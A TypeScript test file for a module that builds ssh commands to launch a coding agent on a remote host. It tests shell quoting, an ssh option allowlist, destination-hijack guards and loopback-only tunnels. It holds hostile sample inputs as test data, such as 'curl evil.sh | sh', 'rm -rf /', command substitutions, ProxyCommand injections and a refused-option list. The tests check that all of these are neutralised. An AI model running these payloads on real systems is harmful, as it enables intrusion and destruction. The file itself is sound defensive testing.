import { execFileSync } from "node:child_process";
import { existsSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import * as Path from "node:path";

import type { RemoteCommandTarget, RemoteHostConfig, RemoteLauncher } from "@synara/contracts";
import * as FastCheck from "effect/testing/FastCheck";
import { describe, expect, it } from "vitest";

import {
  ALLOWED_SSH_OPTIONS,
  buildLauncherArgv,
  buildRemoteScript,
  buildSshArgv,
  buildSshTunnelArgv,
  DETACHING_LAUNCHER_COMMANDS,
  posixShellJoin,
  posixShellQuote,
  PROBE_EXIT_BINARY_MISSING,
  PROBE_EXIT_CWD_MISSING,
  remoteCommandSignature,
  RemoteHostConfigError,
  sshControlPathFor,
  validateRemoteHostConfig,
  validateSshArgs,
} from "./remoteCommand";

const HOST_ID = "host-1" as RemoteHostConfig["hostId"];

function makeConfig(overrides: Partial<RemoteHostConfig> = {}): RemoteHostConfig {
  return {
    hostId: HOST_ID,
    label: "Workstation",
    destination: "build-box",
    sshArgs: [],
    hostKeyVerification: "strict",
    connectTimeoutSeconds: 10,
    keepalive: { intervalSeconds: 15, countMax: 3 },
    connectionReuse: { enabled: true, persistSeconds: 300 },
    launcher: { kind: "direct" },
    binaryPath: "/usr/local/bin/claude",
    ...overrides,
  } as RemoteHostConfig;
}

const TARGET: RemoteCommandTarget = {
  cwd: "/home/dev/project",
  args: ["--print", "hello"],
  versionArgs: ["--version"],
};

/** Runs a real /bin/sh and returns the argv it observed, one argument per line. */
function shellArgvOf(commandLine: string): readonly string[] {
  const output = execFileSync("/bin/sh", ["-c", `${commandLine} 2>/dev/null || true`, "sh"], {
    encoding: "utf8",
  });
  return output.split("\u0000").slice(0, -1);
}

describe("posixShellQuote", () => {
  it("emits a word for the empty string so argument positions do not shift", () => {
    expect(posixShellQuote("")).toBe("''");
    // Without this, `printf '%s\0' '' x` would collapse to a single argument.
    expect(shellArgvOf(`printf '%s\\0' ${posixShellJoin(["", "x"])}`)).toEqual(["", "x"]);
  });

  /**
   * Verifies a whole batch in ONE shell invocation. Batching is not only about
   * speed: passing every value as a separate operand of the same `printf` also
   * proves argv BOUNDARIES hold, which a one-value-per-call harness cannot
   * observe at all.
   */
  function expectRoundTrip(values: readonly string[]): void {
    // NUL cannot survive an argv by definition; validateSshArgs and the schema
    // reject it separately (see the NUL rejection tests below).
    const usable = values.filter((value) => !value.includes("\u0000"));
    expect(shellArgvOf(`printf '%s\\0' ${posixShellJoin(usable)}`)).toEqual(usable);
  }

  it("neutralises command substitution, expansion and terminators", () => {
    // One shell for the whole set, via the batching helper above. Spawning a
    // process per payload made this security test take ~6.5s against a 5s
    // default timeout, so it flaked — and a security test that flakes is a
    // security test that gets ignored. Batching also strengthens it: the values
    // must survive as SEPARATE argv entries, not merely unexpanded.
    expectRoundTrip([
      "$(touch /tmp/pwned)",
      "`id`",
      "; rm -rf /",
      "&& curl evil.sh | sh",
      "| tee /etc/passwd",
      "$HOME",
      "${IFS}",
      "a\nrm -rf /",
      "*",
      "~/notexpanded",
      "\\'; id; #",
    ]);
  });

  it("round-trips arbitrary strings, preserving argv boundaries", () => {
    expectRoundTrip(
      FastCheck.sample(FastCheck.string({ minLength: 0, maxLength: 200, unit: "binary" }), 400),
    );
  });

  it("round-trips spaces, quotes, newlines, unicode and control characters", () => {
    const alphabet = FastCheck.oneof(
      FastCheck.constantFrom(" ", "'", '"', "\n", "\t", "\\", "$", "`", "!", "*", "\r"),
      FastCheck.constantFrom("é", "日本語", "🙈", "\u200b", "Ω", "\u001b[31m"),
      FastCheck.string({ minLength: 1, maxLength: 3 }),
    );
    expectRoundTrip(
      FastCheck.sample(FastCheck.array(alphabet, { maxLength: 60 }), 400).map((parts) =>
        parts.join(""),
      ),
    );
  });

  it("round-trips a path far longer than PATH_MAX segments", () => {
    const longPath = `/${Array.from({ length: 200 }, (_, index) => `seg ment'${index}`).join("/")}`;
    expectRoundTrip([longPath, `${longPath}\n${longPath}`]);
  });
});

describe("buildRemoteScript", () => {
  it("quotes the cwd, the binary and every turn argument", () => {
    const script = buildRemoteScript({
      target: { cwd: "/home/dev/my project", args: ["-p", "$(id)"], versionArgs: ["--version"] },
      defaultBinary: "/opt/bin/agent cli",
    });
    expect(script).toContain(`cd -- '/home/dev/my project'`);
    expect(script).toContain(`exec '/opt/bin/agent cli' '-p' '$(id)'`);
    expect(script).not.toMatch(/[^']\$\(id\)/);
  });

  it("does not execute shell-init values — they are quoted data, not code", () => {
    // Prior art took shell-init as raw shell text and interpolated it, which is an
    // injection seam that lives in persisted config. Proven by running the real
    // script in a real shell: the injected command must not run.
    const sentinel = Path.join(mkdtempSync(Path.join(tmpdir(), "synara-probe-")), "pwned");
    const script = buildRemoteScript({
      target: { cwd: tmpdir(), args: [], versionArgs: [] },
      defaultBinary: "/usr/bin/true",
      shellInit: {
        sourceFiles: [`/nonexistent/nvm.sh; touch ${sentinel}`],
        env: { TOKEN: `$(touch ${sentinel})` },
      },
    });
    expect(script).toContain(`export TOKEN='$(touch ${sentinel})'`);
    execFileSync("/bin/sh", ["-c", script], { encoding: "utf8" });
    expect(existsSync(sentinel)).toBe(false);
  });

  it("refuses to run the session anywhere but the requested cwd", () => {
    // A missing cwd must abort. An unguarded `cd` leaves the shell in the ssh
    // login home and execs the agent there — a coding agent with write access
    // pointed at the wrong directory. Proven by running the real script: the
    // marker the agent would have written must not exist, and the exit is
    // non-zero.
    const directory = mkdtempSync(Path.join(tmpdir(), "synara-cwd-"));
    const marker = Path.join(directory, "agent-ran");
    const script = buildRemoteScript({
      target: {
        cwd: "/nonexistent/project/directory",
        args: [marker],
        versionArgs: [],
      },
      defaultBinary: "/usr/bin/touch",
    });
    let status = 0;
    try {
      execFileSync("/bin/sh", ["-c", script], { encoding: "utf8", stdio: "pipe" });
    } catch (error) {
      status = (error as { status: number }).status;
    }
    expect(status).not.toBe(0);
    expect(existsSync(marker)).toBe(false);
  });

  it("runs the session in the requested cwd when it exists", () => {
    const directory = mkdtempSync(Path.join(tmpdir(), "synara-cwd-"));
    const script = buildRemoteScript({
      target: { cwd: directory, args: ["agent-ran"], versionArgs: [] },
      defaultBinary: "/usr/bin/touch",
    });
    execFileSync("/bin/sh", ["-c", script], { encoding: "utf8" });
    expect(existsSync(Path.join(directory, "agent-ran"))).toBe(true);
  });

  it("tolerates a missing shell-init file instead of aborting the session", () => {
    const script = buildRemoteScript({
      target: TARGET,
      defaultBinary: "/bin/agent",
      shellInit: { sourceFiles: ["/does/not/exist"], env: {} },
    });
    expect(script).toContain(`if [ -r '/does/not/exist' ]`);
  });

  it("substitutes the version args for the turn args in probe mode and keeps everything else", () => {
    const session = buildRemoteScript({ target: TARGET, defaultBinary: "/bin/agent" });
    const probe = buildRemoteScript({
      target: TARGET,
      defaultBinary: "/bin/agent",
      probe: { begin: "B", cwdMissing: "C", binaryMissing: "M" },
    });
    // Same cd, same binary: the probe certifies the command that will actually run.
    expect(session).toContain(`cd -- '/home/dev/project'`);
    expect(probe).toContain(`cd -- '/home/dev/project'`);
    expect(session).toContain(`exec '/bin/agent' '--print' 'hello'`);
    expect(probe).toContain(`exec '/bin/agent' '--version'`);
    expect(probe).not.toContain("'hello'");
  });

  it("checks the cwd before the binary, with distinct exit codes", () => {
    const script = buildRemoteScript({
      target: TARGET,
      defaultBinary: "/bin/agent",
      probe: { begin: "B", cwdMissing: "C", binaryMissing: "M" },
    });
    const cdIndex = script.indexOf("cd --");
    const commandIndex = script.indexOf("command -v");
    expect(cdIndex).toBeGreaterThanOrEqual(0);
    expect(commandIndex).toBeGreaterThan(cdIndex);
    expect(script).toContain(`exit ${PROBE_EXIT_CWD_MISSING}`);
    expect(script).toContain(`exit ${PROBE_EXIT_BINARY_MISSING}`);
    expect(PROBE_EXIT_CWD_MISSING).not.toBe(PROBE_EXIT_BINARY_MISSING);
  });

  it("prints the begin marker only after the shell has finished initialising", () => {
    const script = buildRemoteScript({
      target: TARGET,
      defaultBinary: "/bin/agent",
      shellInit: { sourceFiles: ["/etc/profile.d/x.sh"], env: {} },
      probe: { begin: "B", cwdMissing: "C", binaryMissing: "M" },
    });
    expect(script.indexOf("/etc/profile.d/x.sh")).toBeLessThan(
      script.indexOf("printf '%s\\n' 'B'"),
    );
  });

  it("refuses to build without a binary", () => {
    expect(() => buildRemoteScript({ target: TARGET })).toThrow(RemoteHostConfigError);
  });
});

describe("buildLauncherArgv", () => {
  const script = "cd -- '/x'\nexec '/bin/agent'";

  it("hands every launcher the same script as one argument", () => {
    const launchers: readonly RemoteLauncher[] = [
      { kind: "direct" },
      { kind: "login-shell", loginShell: "/bin/zsh" },
      { kind: "container", runtime: "docker", container: "dev", execArgs: ["-u", "dev"] },
      { kind: "custom-wrapper", command: "/usr/bin/env", args: ["-i"] },
    ];
    for (const launcher of launchers) {
      const argv = buildLauncherArgv(launcher, script);
      expect(argv.filter((entry) => entry === script)).toHaveLength(1);
      // The script is always the LAST argument, unsplit and unmodified.
      expect(argv.at(-1)).toBe(script);
    }
  });

  it("refuses every detaching wrapper at the decider, not the UI", () => {
    for (const command of DETACHING_LAUNCHER_COMMANDS) {
      expect(() =>
        buildLauncherArgv({ kind: "custom-wrapper", command, args: [] }, script),
      ).toThrow(RemoteHostConfigError);
      // An absolute path to the same wrapper is the same hazard.
      expect(() =>
        buildLauncherArgv(
          { kind: "custom-wrapper", command: `/usr/bin/${command}`, args: [] },
          script,
        ),
      ).toThrow(RemoteHostConfigError);
    }
  });

  it("refuses detach flags on an otherwise benign wrapper", () => {
    for (const flag of ["-d", "--detach", "--daemon", "--background", "--fork"]) {
      expect(() =>
        buildLauncherArgv(
          { kind: "custom-wrapper", command: "/usr/bin/env", args: [flag] },
          script,
        ),
      ).toThrow(RemoteHostConfigError);
    }
  });

  it("refuses a container exec that allocates a tty or detaches", () => {
    for (const arg of ["-t", "--tty", "-d", "--detach"]) {
      expect(() =>
        buildLauncherArgv(
          { kind: "container", runtime: "docker", container: "dev", execArgs: [arg] },
          script,
        ),
      ).toThrow(RemoteHostConfigError);
    }
  });

  it("keeps container exec non-interactive-safe by passing -i", () => {
    const argv = buildLauncherArgv(
      { kind: "container", runtime: "podman", container: "dev", execArgs: [] },
      script,
    );
    expect(argv.slice(0, 4)).toEqual(["podman", "exec", "-i", "dev"]);
  });

  it("refuses a launcher command that would be read as a flag", () => {
    expect(() =>
      buildLauncherArgv({ kind: "custom-wrapper", command: "-rf", args: [] }, script),
    ).toThrow(RemoteHostConfigError);
  });
});

/** Reads the FIRST value ssh would take for an option, matching its own semantics. */
function optionValue(args: readonly string[], key: string): string | undefined {
  for (let index = 0; index < args.length - 1; index += 1) {
    if (args[index] === "-o" && (args[index + 1] as string).startsWith(`${key}=`)) {
      return (args[index + 1] as string).slice(key.length + 1);
    }
  }
  return undefined;
}

describe("buildSshArgv", () => {
  const invocation = () =>
    buildSshArgv({
      config: makeConfig(),
      remoteArgv: ["/bin/sh", "-c", "echo hi"],
      controlDirectory: "/tmp/synara-ctl",
    });

  it("always sets BatchMode so a password prompt fails instead of hanging", () => {
    expect(optionValue(invocation().args, "BatchMode")).toBe("yes");
  });

  it("always enables host-key verification and never accepts a changed key", () => {
    expect(optionValue(invocation().args, "StrictHostKeyChecking")).toBe("yes");
    const lenient = buildSshArgv({
      config: makeConfig({ hostKeyVerification: "accept-new" }),
      remoteArgv: [],
    });
    // `accept-new` is the weakest setting that exists; `no`/`off` is unrepresentable.
    expect(optionValue(lenient.args, "StrictHostKeyChecking")).toBe("accept-new");
  });

  it("always sets keepalives so a dead connection errors instead of hanging forever", () => {
    const args = invocation().args;
    expect(optionValue(args, "ServerAliveInterval")).toBe("15");
    expect(optionValue(args, "ServerAliveCountMax")).toBe("3");
  });

  it("never allocates a tty", () => {
    expect(optionValue(invocation().args, "RequestTTY")).toBe("no");
  });

  it("places user args before ours so ssh's first-value-wins makes an override real", () => {
    const { args } = buildSshArgv({
      config: makeConfig({ sshArgs: ["-o", "ConnectTimeout=45", "-c", "aes128-gcm@openssh.com"] }),
      remoteArgv: [],
    });
    expect(args.slice(0, 4)).toEqual(["-o", "ConnectTimeout=45", "-c", "aes128-gcm@openssh.com"]);
    // Our default is still present but later, so ssh ignores it.
    expect(args.indexOf("ConnectTimeout=45")).toBeLessThan(args.indexOf("ConnectTimeout=10"));
  });

  // Written out rather than iterated from ALLOWED_SSH_OPTIONS: a test that loops
  // over the set it is testing deletes its own assertion when an entry is
  // removed, so dropping a name from the allowlist would look green. This list
  // is the independent statement of what the allowlist is supposed to contain.
  const EXPECTED_ALLOWED_OPTIONS = [
    "addressfamily",
    "ciphers",
    "compression",
    "connectionattempts",
    "connecttimeout",
    "hostkeyalgorithms",
    "identitiesonly",
    "identityfile",
    "ipqos",
    "kexalgorithms",
    "macs",
    "port",
    "preferredauthentications",
    "proxyjump",
    "pubkeyacceptedalgorithms",
    "pubkeyauthentication",
    "sendenv",
    "serveralivecountmax",
    "serveraliveinterval",
    "setenv",
    "tcpkeepalive",
    "user",
  ] as const;

  it("allows exactly the options on the expected list and no others", () => {
    expect([...ALLOWED_SSH_OPTIONS].sort()).toEqual([...EXPECTED_ALLOWED_OPTIONS].sort());
  });

  it("accepts each expected option in every spelling ssh understands", () => {
    for (const option of EXPECTED_ALLOWED_OPTIONS) {
      for (const spelling of [
        ["-o", `${option}=x`],
        [`-o${option}=x`],
        ["-o", `${option} x`],
        ["-o", `${option.toUpperCase()}=x`],
      ]) {
        expect(() => validateSshArgs(spelling)).not.toThrow();
      }
    }
  });

  // Independent of the allowlist constants for the same reason: these names must
  // stay refused however the allowlist is edited.
  it("refuses each dangerous option by name, in four spellings each", () => {
    for (const option of [
      "StrictHostKeyChecking",
      "UserKnownHostsFile",
      "GlobalKnownHostsFile",
      "CheckHostIP",
      "NoHostAuthenticationForLocalhost",
      "BatchMode",
      "RequestTTY",
      "ControlMaster",
      "ControlPath",
      "ControlPersist",
      "PermitLocalCommand",
      "LocalCommand",
      "ProxyCommand",
      "KnownHostsCommand",
      "Include",
    ]) {
      for (const spelling of [
        ["-o", `${option}=x`],
        [`-o${option}=x`],
        ["-o", `${option} x`],
        ["-o", `${option.toUpperCase()}=x`],
      ]) {
        expect(() => validateSshArgs(spelling)).toThrow(RemoteHostConfigError);
      }
    }
  });

  it("refuses a bare positional, which would otherwise hijack the destination", () => {
    // User args go first, so ssh reads a positional here as THE destination and
    // demotes the real one to the first word of the remote command. Host-key
    // verification does not help: it faithfully verifies the attacker's key.
    for (const args of [
      ["attacker.example.com"],
      ["evil.example.com", "-p", "22"],
      ["-p", "22", "attacker.example.com"],
    ]) {
      expect(() => validateSshArgs(args)).toThrow(RemoteHostConfigError);
    }
  });

  it("accepts the allowlisted flags a user reaches for", () => {
    for (const args of [
      ["-p", "2222"],
      ["-p2222"],
      ["-i", "/home/dev/.ssh/id_ed25519"],
      ["-J", "bastion.example.com"],
      ["-l", "deploy"],
      ["-c", "aes128-gcm@openssh.com"],
      ["-b", "10.0.0.2"],
      ["-m", "hmac-sha2-256"],
      ["-4"],
      ["-6"],
      ["-C"],
      ["-a"],
      ["-x"],
      // Several at once, mixing attached and separated values.
      ["-4", "-p2222", "-i", "/k", "-o", "Compression=yes", "-J", "bastion"],
    ]) {
      expect(() => validateSshArgs(args)).not.toThrow();
    }
  });

  it("refuses anything not on the allowlist, in every spelling ssh would accept", () => {
    for (const args of [
      // -F swaps in another config file, which is a bypass of the whole option
      // allowlist at once. Both spellings.
      ["-F/dev/null"],
      ["-F", "/dev/null"],
      // Executes a command on THIS machine before any connection.
      ["-oProxyCommand=printf pwned"],
      ["-o", "ProxyCommand=printf pwned"],
      ["-o", "LocalCommand=printf pwned"],
      ["-o", "PermitLocalCommand=yes"],
      ["-o", "Match exec printf pwned"],
      // Control socket, short flag and long option alike.
      ["-S/tmp/attacker.sock"],
      ["-S", "/tmp/attacker.sock"],
      ["-o", "ControlPath=/tmp/attacker.sock"],
      ["-M"],
      // A pty corrupts the protocol stream.
      ["-tt"],
      ["-t"],
      ["-vtt"],
      ["-o", "RequestTTY=yes"],
      // Host-key verification.
      ["-o", "StrictHostKeyChecking=no"],
      ["-oStrictHostKeyChecking=no"],
      ["-o", "stricthostkeychecking=no"],
      ["-o", "StrictHostKeyChecking no"],
      ["-o", "UserKnownHostsFile=/dev/null"],
      ["-o", "Include=/tmp/evil"],
      ["-o", "BatchMode=no"],
      // Detach, forwarding and stream redirection.
      ["-f"],
      ["-N"],
      ["-n"],
      ["-g"],
      ["-L", "8080:localhost:80"],
      ["-R", "8080:localhost:80"],
      ["-D", "1080"],
      ["-W", "host:22"],
      ["-w", "0:0"],
      // A flag hidden in the value position of an allowlisted flag.
      ["-p", "-oProxyCommand=printf pwned"],
      ["-i", "-F/dev/null"],
      // An allowlisted value flag with nothing to consume.
      ["-p"],
      ["-o"],
      // Bundled short flags, each verified against a real ssh to be honoured.
      ["-Nf"],
      ["-fN"],
      ["-D1080"],
      ["-L8080:localhost:80"],
      ["-w0:0"],
      // -E writes ssh's log where it is told, an arbitrary file clobber.
      ["-E/tmp/clobber"],
      ["-E", "/tmp/clobber"],
      // Runs a command on THIS machine to produce known-hosts material.
      ["-o", "KnownHostsCommand=/bin/sh -c x"],
      // Repeated and long-form spellings.
      ["-o", "Compression=yes", "-o", "ProxyCommand=printf pwned"],
      ["--config=/dev/null"],
    ]) {
      expect(() => validateSshArgs(args)).toThrow(RemoteHostConfigError);
    }
  });

  it("refuses option names case-insensitively, since ssh compares them that way", () => {
    for (const spelling of ["PROXYCOMMAND", "proxycommand", "ProxyCoMmAnD"]) {
      expect(() => validateSshArgs(["-o", `${spelling}=printf pwned`])).toThrow(
        RemoteHostConfigError,
      );
    }
  });

  it("points a refused user at the ~/.ssh/config escape hatch", () => {
    expect(() => validateSshArgs(["-o", "ProxyCommand=printf pwned"])).toThrow(/~\/\.ssh\/config/);
    expect(() => validateSshArgs(["-F", "/dev/null"])).toThrow(/~\/\.ssh\/config/);
  });

  it("refuses a destination that ssh would read as a flag or split into words", () => {
    expect(() =>
      validateRemoteHostConfig(makeConfig({ destination: "-oProxyCommand=id" })),
    ).toThrow(RemoteHostConfigError);
    expect(() => validateRemoteHostConfig(makeConfig({ destination: "host -o X=1" }))).toThrow(
      RemoteHostConfigError,
    );
  });

  it("enables multiplexing by default so N sessions share one handshake", () => {
    const args = invocation().args;
    expect(optionValue(args, "ControlMaster")).toBe("auto");
    expect(optionValue(args, "ControlPersist")).toBe("300");
    expect(optionValue(args, "ControlPath")).toBe(
      sshControlPathFor("/tmp/synara-ctl", makeConfig()),
    );
  });

  it("derives one stable, short control path per host", () => {
    const path = sshControlPathFor("/tmp/synara-ctl", makeConfig());
    expect(path).toBe(sshControlPathFor("/tmp/synara-ctl/", makeConfig()));
    expect(path).not.toBe(
      sshControlPathFor("/tmp/synara-ctl", makeConfig({ destination: "other" })),
    );
    // sockaddr_un is ~104 bytes; a %h/%p/%r template routinely exceeds it.
    expect(path.length).toBeLessThan(90);
  });

  it("omits multiplexing when the caller has no private control directory", () => {
    const { args } = buildSshArgv({ config: makeConfig(), remoteArgv: [] });
    expect(args.join(" ")).not.toContain("ControlMaster");
  });

  it("quotes the remote argv, since ssh concatenates it into a remote shell command", () => {
    const { args } = buildSshArgv({
      config: makeConfig(),
      remoteArgv: ["/bin/sh", "-c", "cd -- '/a b'\nexec x"],
    });
    expect(args.at(-1)).toBe(`'cd -- '\\''/a b'\\''\nexec x'`);
    expect(args.at(-3)).toBe("'/bin/sh'");
  });

  it("puts exactly the configured destination in the destination position", () => {
    // Pins the hijack: whatever sshArgs contains, the argument ssh reads as the
    // destination is the one from config and nothing else.
    const { args } = buildSshArgv({
      config: makeConfig({ sshArgs: ["-p", "2222", "-o", "Compression=yes"] }),
      remoteArgv: ["/bin/sh", "-c", "true"],
    });
    const separator = args.indexOf("--");
    expect(separator).toBeGreaterThan(-1);
    expect(args[separator + 1]).toBe("build-box");
    // Nothing before the separator is a bare positional that ssh could mistake
    // for a destination.
    expect(args.slice(0, separator).filter((arg) => arg === "build-box")).toEqual([]);
  });

  it("ends ssh's option parsing before the destination", () => {
    const { args } = buildSshArgv({ config: makeConfig(), remoteArgv: [] });
    expect(args[args.indexOf("--") + 1]).toBe("build-box");
  });

  it("proves with a real ssh that `--` stops a dashed destination being read as a flag", () => {
    // The comment this replaces claimed ssh has no `--` marker. It does. Without
    // it a -oProxyCommand destination executes; with it ssh refuses the name.
    const ssh = ["/usr/bin/ssh", "/bin/ssh"].find((path) => existsSync(path));
    if (ssh === undefined) return;
    const sentinel = Path.join(mkdtempSync(Path.join(tmpdir(), "synara-ssh-")), "pwned");
    let output = "";
    try {
      output = execFileSync(ssh, ["-G", "--", `-oProxyCommand=touch ${sentinel}`], {
        encoding: "utf8",
        stdio: "pipe",
      });
    } catch (error) {
      output = String((error as { stderr?: string }).stderr ?? "");
    }
    expect(existsSync(sentinel)).toBe(false);
    expect(output).not.toContain(`proxycommand touch ${sentinel}`);
  });

  it("uses the configured ssh binary", () => {
    expect(
      buildSshArgv({ config: makeConfig({ sshBinary: "/opt/ssh" }), remoteArgv: [] }).command,
    ).toBe("/opt/ssh");
    expect(buildSshArgv({ config: makeConfig(), remoteArgv: [] }).command).toBe("ssh");
  });
});

describe("remoteCommandSignature", () => {
  it("changes whenever any field that shapes the command changes", () => {
    const base = () =>
      remoteCommandSignature(
        buildSshArgv({
          config: makeConfig(),
          remoteArgv: buildLauncherArgv(
            { kind: "direct" },
            buildRemoteScript({ target: TARGET, defaultBinary: "/bin/agent" }),
          ),
        }),
      );
    const variants: ReadonlyArray<() => string> = [
      () =>
        remoteCommandSignature(
          buildSshArgv({ config: makeConfig({ destination: "other" }), remoteArgv: [] }),
        ),
      () =>
        remoteCommandSignature(
          buildSshArgv({
            config: makeConfig({ sshArgs: ["-o", "Compression=yes"] }),
            remoteArgv: [],
          }),
        ),
      () =>
        remoteCommandSignature(
          buildSshArgv({
            config: makeConfig(),
            remoteArgv: buildLauncherArgv(
              { kind: "login-shell" },
              buildRemoteScript({ target: TARGET, defaultBinary: "/bin/agent" }),
            ),
          }),
        ),
      () =>
        remoteCommandSignature(
          buildSshArgv({
            config: makeConfig(),
            remoteArgv: buildLauncherArgv(
              { kind: "direct" },
              buildRemoteScript({
                target: { ...TARGET, cwd: "/other" },
                defaultBinary: "/bin/agent",
              }),
            ),
          }),
        ),
      () =>
        remoteCommandSignature(
          buildSshArgv({
            config: makeConfig(),
            remoteArgv: buildLauncherArgv(
              { kind: "direct" },
              buildRemoteScript({
                target: TARGET,
                defaultBinary: "/bin/agent",
                shellInit: { sourceFiles: [], env: { FOO: "1" } },
              }),
            ),
          }),
        ),
    ];
    const original = base();
    expect(base()).toBe(original);
    for (const variant of variants) {
      expect(variant()).not.toBe(original);
    }
  });
});

describe("buildSshTunnelArgv", () => {
  it("forwards a loopback port to the remote's loopback port and runs no command", () => {
    const { command, args } = buildSshTunnelArgv({
      config: makeConfig(),
      localPort: 45123,
      remotePort: 39100,
    });
    expect(command).toBe("ssh");
    expect(args).toContain("-L");
    expect(args[args.indexOf("-L") + 1]).toBe("127.0.0.1:45123:127.0.0.1:39100");
    expect(args).toContain("-N");
    // The destination is the LAST word and comes after `--`, so nothing that
    // follows can be read as a flag and there is no remote command at all.
    expect(args.slice(-2)).toEqual(["--", "build-box"]);
  });

  /**
   * The forward's bind address must be spelled out. Omitting it makes the bind
   * depend on GatewayPorts, which a user's ~/.ssh/config may set, and the
   * difference between the two spellings is a port exposed to the whole network
   * rather than to this machine.
   */
  it("binds the near end to loopback explicitly, never a bare port", () => {
    const { args } = buildSshTunnelArgv({
      config: makeConfig(),
      localPort: 45123,
      remotePort: 39100,
    });
    const spec = args[args.indexOf("-L") + 1] as string;
    expect(spec.startsWith("127.0.0.1:")).toBe(true);
    expect(spec.split(":")).toHaveLength(4);
    expect(spec).not.toContain("localhost");
    expect(spec).not.toContain("*");
  });

  /**
   * Mutation guard for the property the whole design rests on: a `-L` a USER
   * typed is still refused, and only the one this function builds from two
   * integers gets through. If validateSshArgs stopped being called here, a host
   * record could name any bind address and any destination on the remote's
   * network.
   */
  it("still refuses a user-supplied forward while emitting its own", () => {
    for (const hostile of [
      ["-L", "0.0.0.0:1234:internal.corp:22"],
      ["-L8080:localhost:80"],
      ["-R", "9000:localhost:9000"],
      ["-D", "1080"],
      ["-N"],
      ["-f"],
      ["-o", "StrictHostKeyChecking=no"],
      ["-o", "ProxyCommand=printf pwned"],
    ]) {
      expect(() =>
        buildSshTunnelArgv({
          config: makeConfig({ sshArgs: hostile }),
          localPort: 45123,
          remotePort: 39100,
        }),
      ).toThrow(RemoteHostConfigError);
    }
  });

  /**
   * A non-integer port stringifies into extra colons and re-parses as a
   * DIFFERENT forward — `45123.5` would move the bind address. Refusing makes
   * the spec unambiguous by construction rather than by hope.
   */
  it("refuses a port that is not an integer in range", () => {
    for (const port of [0, -1, 65_536, 1.5, Number.NaN, Number.POSITIVE_INFINITY]) {
      expect(() =>
        buildSshTunnelArgv({ config: makeConfig(), localPort: port, remotePort: 39100 }),
      ).toThrow(RemoteHostConfigError);
      expect(() =>
        buildSshTunnelArgv({ config: makeConfig(), localPort: 45123, remotePort: port }),
      ).toThrow(RemoteHostConfigError);
    }
  });

  /**
   * Without ExitOnForwardFailure ssh reports a failed forward on stderr and
   * then sits there CONNECTED — the child stays alive while nothing listens on
   * the local port. Healthy-looking, and every request through it refused.
   */
  it("exits rather than staying up with a forward that failed", () => {
    const { args } = buildSshTunnelArgv({
      config: makeConfig(),
      localPort: 45123,
      remotePort: 39100,
    });
    expect(args).toContain("ExitOnForwardFailure=yes");
  });

  /**
   * A forward over a dead TCP connection never errors — reads simply never
   * complete — so without keepalives the proxy hands requests to a socket that
   * will never answer and every turn through it hangs.
   */
  it("carries keepalives so a dead connection is reported rather than hung", () => {
    const { args } = buildSshTunnelArgv({
      config: makeConfig({ keepalive: { intervalSeconds: 7, countMax: 2 } }),
      localPort: 45123,
      remotePort: 39100,
    });
    expect(args).toContain("ServerAliveInterval=7");
    expect(args).toContain("ServerAliveCountMax=2");
  });

  it("verifies the host key, and cannot be asked not to", () => {
    expect(
      buildSshTunnelArgv({ config: makeConfig(), localPort: 45123, remotePort: 39100 }).args,
    ).toContain("StrictHostKeyChecking=yes");
    expect(
      buildSshTunnelArgv({
        config: makeConfig({ hostKeyVerification: "accept-new" }),
        localPort: 45123,
        remotePort: 39100,
      }).args,
    ).toContain("StrictHostKeyChecking=accept-new");
    // There is no input that produces `no`.
    for (const verification of ["strict", "accept-new"] as const) {
      const { args } = buildSshTunnelArgv({
        config: makeConfig({ hostKeyVerification: verification }),
        localPort: 45123,
        remotePort: 39100,
      });
      expect(args).not.toContain("StrictHostKeyChecking=no");
    }
  });

  it("refuses a dashed destination the same way every other builder does", () => {
    expect(() =>
      buildSshTunnelArgv({
        config: makeConfig({ destination: "-oProxyCommand=id" }),
        localPort: 45123,
        remotePort: 39100,
      }),
    ).toThrow(RemoteHostConfigError);
  });

  it("is an argv array, never a shell string", () => {
    const { args } = buildSshTunnelArgv({
      config: makeConfig(),
      localPort: 45123,
      remotePort: 39100,
    });
    expect(Array.isArray(args)).toBe(true);
    for (const token of args) expect(typeof token).toBe("string");
  });
});
